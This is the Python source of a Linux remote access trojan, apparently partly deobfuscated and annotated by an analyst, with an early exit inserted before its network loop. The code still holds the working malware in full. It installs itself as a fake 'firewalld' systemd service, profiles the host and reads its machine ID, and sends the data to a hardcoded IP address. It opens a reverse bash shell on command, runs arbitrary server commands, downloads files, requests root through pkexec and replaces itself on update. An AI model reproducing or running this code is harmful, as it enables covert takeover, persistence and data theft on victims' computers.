#! /usr/bin/env python3

import sys
import socket
import pty
import time
import sys
import os
import re
import fcntl
import stat

try:
    import platform
    import base64
    import subprocess
except:
    pass

python_version_is_2 = sys.version_info [0] == 2

def decode_string (somestring: str):
    # useless statement, there is no variable with this name
    # global l1ll111_opy_

    last_sybmol_ansi = ord (somestring [-1])
    string_without_last_char = somestring [:-1]

    l111ll_opy_ = last_sybmol_ansi % len (string_without_last_char)
    l11l1ll_opy_ = string_without_last_char[:l111ll_opy_] + string_without_last_char [l111ll_opy_:]

    if python_version_is_2:
        l1l1l_opy_ = l1l111l_opy_ () .join ([l11ll1_opy_ (ord (char) - 2048 - (l11ll1l_opy_ + last_sybmol_ansi) % 7) for l11ll1l_opy_, char in enumerate (l11l1ll_opy_)])
    else:
        l1l1l_opy_ = str () .join ([chr (ord (char) - 2048 - (l11ll1l_opy_ + last_sybmol_ansi) % 7) for l11ll1l_opy_, char in enumerate (l11l1ll_opy_)])

    return eval (l1l1l_opy_)


VERSION = "2.0.0"
SERVER_ADDRESS = '185.10.68.212'

# 
# def print(values):
#     pass

print(f"VERSION {VERSION} for host {SERVER_ADDRESS}")

class custom_exception(Exception):
    pass


def convert_path(path):
    if sys.version_info[0] >= 3:
        return str(path)
    else:
        return path


# Main function to play a sound. Works through Gst ( gnome streamer )
def play_filename(filename, block = True):
    filename = convert_path(filename)

    from os.path import abspath, exists
    try:
        from urllib.request import pathname2url
    except ImportError:
        from urllib import pathname2url

    import gi
    gi.l1ll1l_opy_('Gst', '1.0')
    from gi.repository import Gst
    Gst.init(None)
    l1l1111_opy_ = Gst.l1l111_opy_.l1l11ll_opy_('playbin', 'playbin')
    if filename.startswith(('http://', 'https://')):
        l1l1111_opy_.l1ll11l_opy_.uri = filename
    else:
        path = abspath(filename)
        if not exists(path):
            raise custom_exception('File not found {}'.format(path))
        l1l1111_opy_.l1ll11l_opy_.uri = 'file://' + pathname2url(path)
    l1lll111_opy_ = l1l1111_opy_.l1ll11ll_opy_(Gst.State.l11111_opy_)
    if l1lll111_opy_ != Gst.l11111l_opy_.l1llll1l_opy_:
        raise custom_exception(
            "playbin.set_state returned " + repr(l1lll111_opy_))
    if block:
        l11lll1_opy_ = l1l1111_opy_.l111ll1_opy_()
        try:
            l11lll1_opy_.poll(Gst.l1l1l1l_opy_.l1llll11_opy_, Gst.l1ll1ll_opy_)
        finally:
            l1l1111_opy_.l1ll11ll_opy_(Gst.State.l1l1l1_opy_)


# Too lazy to deobfuscate. Seems to be a fallback function for playing a sound.
def _1ll1111_opy_(l1ll11_opy_, filename, block = True, l1l1l11_opy_ = False):
    from l1ll1l11_opy_    import l1111ll_opy_
    from os.path    import abspath, exists
    from subprocess import check_call
    from threading  import Thread
    
    filename = convert_path(filename)
    
    class l11llll_opy_(Thread):
        def run(self):
            self.exc = None
            try:
                self.l111lll_opy_ = self._target(*self._args, **self._kwargs)
            except BaseException as e:
                self.exc = e
        def join(self, timeout = None):
            super().join(timeout)
            if self.exc:
                raise self.exc
            return self.l111lll_opy_
    
    if not exists(abspath(filename)):
        raise custom_exception('Cannot find a sound with filename: ' + filename)

    l1llll1_opy_ = abspath(l1111ll_opy_(lambda: 0))
    t = l11llll_opy_(target = lambda: check_call([l1ll11_opy_, l1llll1_opy_, _1lllll1_opy_(filename) if l1l1l11_opy_ else filename]))
    t.start()
    if block:
        t.join()

l11ll_opy_ = play_filename


if len(sys.argv) > 2:
    try:
        import gi
        gi.l1ll1l_opy_('Gst', '1.0')
        from gi.repository import Gst
    except:
        l11ll_opy_ = lambda filename, block = True: _1ll1111_opy_('/usr/bin/python3', filename, block, l1l1l11_opy_ = False)



def set_wallpaper(filename):
    local_filename = os.path.expanduser(filename)

    successful_attempts = 0

    try:
        a = os.system("gsettings set org.gnome.desktop.background picture-uri file://PATHPATH".replace("PATHPATH", local_filename))
        if a == 0:
            successful_attempts += 1
    except:
        pass

    try:
        a = os.system("""qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript \'\n    var allDesktops = desktops();\n    print (allDesktops);\n    for (i=0;i<allDesktops.length;i++) {{\n        d = allDesktops[i];\n        d.wallpaperPlugin = \\"org.kde.image\\";\n        d.currentConfigGroup = Array(\\"Wallpaper\\",\n                                        \\"org.kde.image\\",\n                                        \\"General\\");\n        d.writeConfig(\\"Image\\", \\"file://PATHPATH\\")\n    }}\n    \'""".replace(decode_string (u"ࠥࡔࡆ࡚ࡈࡑࡃࡗࡌࠧࠔ"), local_filename))
        if a == 0:
            successful_attempts += 1
    except:
        pass

    try:
        a = os.system("feh --bg-scale PATHPATH".replace("PATHPATH", local_filename))
        if a == 0:
            successful_attempts += 1
    except:
        pass

    try:
        a = os.system("xwallpaper --zoom PATHPATH".replace("PATHPATH", local_filename))
        if a == 0:
            successful_attempts += 1
    except:
        pass

    return successful_attempts




######## SERVICE DATA

scriptpath_user = os.path.expanduser("~/.local/bin/firewalld-user-service")
servicepath_user = os.path.expanduser("~/.config/systemd/user/firewalld-user.service")

scriptpath_root = "/usr/bin/firewalld-user-service"
servicepath_root = "/usr/lib/systemd/system/firewalld-userc.service"

service_user = """[Unit]\nDescription=firewalld - dynamic firewall daemon (user management service)\n\n[Service]\nRestart=always\nRestartSec=3\nExecStart=/usr/bin/env python3 userlocation\n\n[Install]\nWantedBy=default.target""".replace("userlocation", servicepath_user)
service_root = """[Unit]\nDescription=firewalld - dynamic firewall daemon (user management service)\n\n[Service]\nRestart=always\nRestartSec=3\nExecStart=/usr/bin/env python3 rootlocation\n\n[Install]\nWantedBy=default.target""".replace("rootlocation", servicepath_root)

running_as_root = False
running_as_user = False




######## CHECK, IN WHICH MODE ARE WE RUNNING

try:
    running_as_root = os.path.samefile(__file__, servicepath_root)
except:
    pass

try:
    running_as_user = os.path.samefile(__file__, servicepath_user)
except:
    pass



######## DISABLE THE SERVICE IN CASE OF UPDATING

if len(sys.argv) == 2 and os.getuid() == 0:
    print("ROOT: disable old process")
    os.system("systemctl --user --machine=" + sys.argv[1] + "@ stop firewalld-user")
    os.system("systemctl --user --machine=" + sys.argv[1] + "@ disable firewalld-user")





####### CREATE LOCK FILE

l1ll111l_opy_ = "/tmp/YaaafLS12adK4afAd352.tmp"
try:
    os.system("touch " + l1ll111l_opy_)
    os.system("chmod 0777 " + l1ll111l_opy_)
    f = open(l1ll111l_opy_, "r")
    fcntl.flock(f, fcntl.LOCK_EX|fcntl.LOCK_NB)
except IOError:
    print("Already running")
    exit(1)





####### ENABLE THE SERVICE

# If we are running as root, run service as root
if os.getuid() == 0 and not running_as_root:
    f = open(servicepath_root, "w+")
    f.write(open(__file__, "r").read())
    f.close()
    os.chmod(servicepath_root, 0o0777)
    f = open(scriptpath_root, "w+")
    f.write(service_root)
    f.close()
    c = os.system('systemctl enable firewalld-userc && systemctl start firewalld-userc')
    if c == 0:
        print("ROOT: Sucess: infected!")
        exit()

elif os.getuid() != 0 and not running_as_user:
    os.system("mkdir -p " + servicepath_user[:servicepath_user.rindex("/")])
    f = open(servicepath_user, "w+")
    f.write(open(__file__, "r").read())
    f.close()
    os.chmod(servicepath_user, 0o0777)
    os.system("mkdir -p " + scriptpath_user[:scriptpath_user.rindex("/")])
    f = open(scriptpath_user, decode_string (u"ࠤࡺ࠯ࠧ࠶"))
    f.write(service_user)
    f.close()
    c = os.system("systemctl enable --user firewalld-user && systemctl start --user firewalld-user")
    if c == 0:
        print("Success: infected!")
        exit()





####### MAIN LOOP

user_info = ""
custom_cmd = ""
custom_comment = ""
custom_cmd_timeout = 0

while True:
    # Check the user's id, and write it to the variable
    try:
        if os.getuid() != 0:
            user_info += os.popen('whoami').read()[:-1] + '\n'
        else:
            user_info += "root\n"
    except:
        # When we can'get user's id
        user_info += "ERR\n"

    # Get user's DE type
    try:
        user_sessions = os.popen("ps aux | grep session | grep -v grep | grep -v '\\-\\-' | awk '{print $NF}'").read()[:-1].split('\n')
        
        user_sessions_2 = ','.join(os.popen("loginctl show-session `loginctl|grep $(whoami)|awk '{print $1}'` -p Type | sed -e 's/Type=//' | awk NF").read()[:-1].split('\n'))

        session_type = ""

        # Determine session type
        for session in user_sessions:
            if "gnome-session" in session:
                session_type = "gnome"
            elif "mate-session" in session:
                session_type = "mate"
            elif "xfce4-session" in session:
                session_type = "xfce4"
            elif "plasma" in session:
                session_type = "plasma"

        # If we cannot determine the type of the session
        if not session_type:
            for session in user_sessions:
                if "session" in session:
                    session_type = session

        if not session_type:
            session_type = "unknown"

        user_info += session_type + ' on ' + user_sessions_2 + '\n'
    except:
        user_info += "ERR\n"

    # Get python version
    try:
        user_info += platform.python_version().strip() + '\n'
    except:
        user_info += "ERR\n"

    # Get CPU info
    try:
        cpu_vendor = os.popen('cat /proc/cpuinfo | grep vendor_id | tail -1').read()[:-1].split(" ")[-1].strip()
        cpu_max_freq = os.popen('lscpu -e=MAXMHZ').read()[:-1].split('\n')

        cpu_core_count = str(len(cpu_max_freq) - 1)
        cpu_max_freq_parsed_mhz = cpu_max_freq[1].split('.')[0].strip()
        cpu_max_freq_parsed_mhz = cpu_max_freq_parsed_mhz.split(',')[0].strip()

        # If we can't get max frequency, try to get current frequency
        if cpu_max_freq_parsed_mhz == '-':
            cpu_max_freq_parsed_mhz = os.popen('lscpu -e=MHZ').read()[:-1].split('\n')[1].split('.')[0].strip()

        if cpu_vendor == "AuthenticAMD":
            user_info += "A " + cpu_core_count + " @ " + cpu_max_freq_parsed_mhz + "MHz\n"
        elif cpu_vendor == "GenuineIntel":
            user_info += "I " + cpu_core_count + " @ " + cpu_max_freq_parsed_mhz + "MHz\n"
        else:
            user_info += "U " + cpu_core_count + " @ " + cpu_max_freq_parsed_mhz + "MHz\n"
    except:
        user_info += "ERR\n"


    # Get distribution name
    try:
        user_info += os.popen('cat /etc/os-release | grep NAME').read()[:-1].split('\n')[0].replace("PRETTY_", '').replace("NAME=", "").replace('"', '').strip() + '\n'
    except:
        user_info += "ERR\n"


    # Get kernel version
    try:
        user_info += platform.uname().release.strip() + '\n'
    except:
        user_info += "ERR\n"
    
    # Get RAT version
    user_info += VERSION + "\n"

    # Get uptime info
    try:
        uptime = os.popen('uptime -p').read()[:-1].strip()
        uptime = re.sub(' min[a-z]*', 'm', uptime) # Months
        uptime = re.sub(' hou[a-z]*', 'h', uptime) # Hours
        uptime = re.sub(' da[a-z]*', 'd', uptime) # Days
        uptime = uptime.replace('up', '')
        user_info += uptime.strip() + '\n'
    except:
        # Somehow, authors forgot about \n here
        user_info += "ERR"

    # Detect virtual machine
    try:
        # user_info += os.popen('systemd-detect-virt').read()[:-1].strip() + '\n'
        # Hide the virtual machine
        user_info += 'https://t.me/+G6w6EXmwixo5NGEy\n'
    except:
        user_info += "ERR"

    # Get machine UUID
    try:
        user_info += open("/etc/machine-id", 'r').read().strip() + '\n'
    except:
        user_info += "ERR"
    
    # Check for custom command, and run it
    if custom_cmd != "":
        if custom_cmd_timeout > 0:
            try:
                try:
                    output = subprocess.check_output(custom_cmd, stderr=subprocess.STDOUT, timeout=custom_cmd_timeout, shell=True)
                    custom_cmd_output = 'b' + user_info + '\n' + output.decode("UTF-8")
                except Exception as e:
                    output = str(e.output)
                    custom_cmd_output = "b" + user_info + '\n' + output
                custom_cmd = ''
                custom_cmd_timeout = 0
            except Exception as e:
                custom_cmd_output = 'b' + user_info + '\n' + str(e)
                custom_cmd = ''
                custom_cmd_timeout = 0
        else:
            if os.fork() == 0:
                os.execv('/bin/bash', ['/bin/bash', '-c', custom_cmd])
            else:
                custom_cmd = decode_string (u"ࠣࠤࢗ")
    else:
        if custom_comment != "":
            custom_cmd_output = "b" + user_info + '\n' + custom_comment
            custom_comment = ''
        else:
            custom_cmd_output = "a" + user_info

    # Print the user data
    print(f"User data:\n{custom_cmd_output}")

    exit(1)

    # THE FUN PART BEGINS HERE
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_ADDRESS, 1488))

        # Send user data to the server >:)
        print(f"\n\n{custom_cmd_output}")
        d = bytes(custom_cmd_output, encoding="UTF-8")
        sock.send(d)

        user_info = ""
        data = sock.recv(1024 * 2)
        sock.close()

        server_command = data.decode("UTF-8")

        if server_command[:5] == "shell":
            time.sleep(2)
            if os.fork() == 0:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((SERVER_ADDRESS, int(server_command.split(":")[1])))

                fd1 = os.dup(1)
                fd2 = os.dup(0)
                fd3 = os.dup(2)

                os.dup2(s.fileno(),0)
                os.dup2(s.fileno(),1)
                os.dup2(s.fileno(),2)

                pty.spawn("/bin/bash")
                
                s.close()
                
                os.dup2(fd1, 1)
                os.close(fd1)
                os.dup2(fd2, 0)
                os.close(fd2)
                os.dup2(fd3,2)
                os.close(fd3)
                
                exit()

        elif server_command == "banned":
            print("BANNED")
            exit(1)
        
        elif server_command[:6] == "update":
            script_path = os.path.expanduser(server_command[7:].strip())

            update_contents = open(script_path, 'r').read()
            
            f = open(__file__, 'w')
            f.write(update_contents)
            f.close()

            os.execv(sys.executable, ["python3"] + sys.argv)

        elif server_command[:4] == "exec":
            custom_cmd = server_command[15:]
            custom_cmd_timeout = int(server_command.split(':')[1])

        elif server_command[:8] == "loadfile":
            method = 0
            try:
                subprocess.call(['curl'])
                method = 1
            except:
                try:
                    subprocess.call(['wget'])
                    method = 2
                except:
                    custom_comment += "ERROR: No wget and no curl"
                    continue

            try:
                url = server_command.split('\n')[1]
                filename = server_command.split('\n')[2]

                content = None
                filename = os.path.expanduser(filename)

                if method == 0:
                    custom_comment += "ERROR: no wget and no curl"
                    continue
                
                if method == 1:
                    try:
                        os.makedirs(filename[:filename.rfind('/')], exist_ok=True)
                        custom_comment = "OK: " + subprocess.check_output("curl " + url + " -o'" + filename + "'", stderr=subprocess.STDOUT, timeout=1000, shell=True).decode("utf-8")
                    except Exception as e:
                        custom_comment += str(e.output)
                    continue
                
                elif method == 2:
                    try:
                        os.makedirs(filename[:filename.rfind("/")], exist_ok=True)
                        custom_comment = "OK: " + subprocess.check_output("wget -O '" + filename + "' " + url, stderr=subprocess.STDOUT, timeout=1000, shell=True).decode("utf-8")
                    except Exception as e:
                        custom_comment += str(e.output)
                    continue

            except Exception as e:
                custom_comment += str(e.output)

        elif server_command == "askroot":
            try:
                pcexec_path = os.popen("which pkexec").read()[:-1].split("\n")[-1].strip()
                if "no pkexec in" in pcexec_path:
                    custom_comment = "ERROR: no pkexec found"
                else:
                    pid = os.fork()
                    if pid != 0:
                        os.execv(pcexec_path, [pcexec_path, sys.executable, __file__,  os.getlogin()])
            except Exception as e:
                pass

        elif server_command[:9] == "playsound":
            filename = ""
            try:
                os.system("amixer -q sset Master 100%")
                filename = server_command.split(":")[1]
                filename = os.path.expanduser(filename)
                l11ll_opy_(filename)
                custom_comment = "OK: it seems like file " + server_command.split(":")[1] + " was played"
            except Exception as e:
                try:
                    subprocess.call(["aplay"])
                    os.system("aplay " + filename)
                    custom_comment = "OK: it seems like file " + server_command.split(":")[1] + " was played"
                except Exception as e:
                    custom_comment = "Cannot play file and no aplay: " + str(e)

        elif server_command[:9] == "wallpaper":
            try:
                filename = server_command.split(decode_string (u"ࠤ࠽࣐ࠦ"))[1]
                out = set_wallpaper(filename)
                custom_comment = "Wallpaper: " + str(out) + "/4 commands succeed"
            except Exception as e:
                custom_comment = str(e)

        elif server_command[:14] == "directloadfile":
            try:
                filename = server_command.split(":")[1]
                l11lll_opy_ = server_command[15:]
                content = l11lll_opy_[l11lll_opy_.index(":"):]
                filename = os.path.expanduser(filename)
                os.makedirs(filename[:filename.rfind(decode_string (u"ࠣ࠱ࠥࣖ"))], exist_ok=True)
                open(filename, 'w+').write(content)
                custom_comment = "OK: file " + filename + " written"
            except Exception as e:
                custom_comment = str(e)

    except ConnectionResetError as e:
        print(e)
    except ConnectionRefusedError as e:
        print(e)

    time.sleep(30)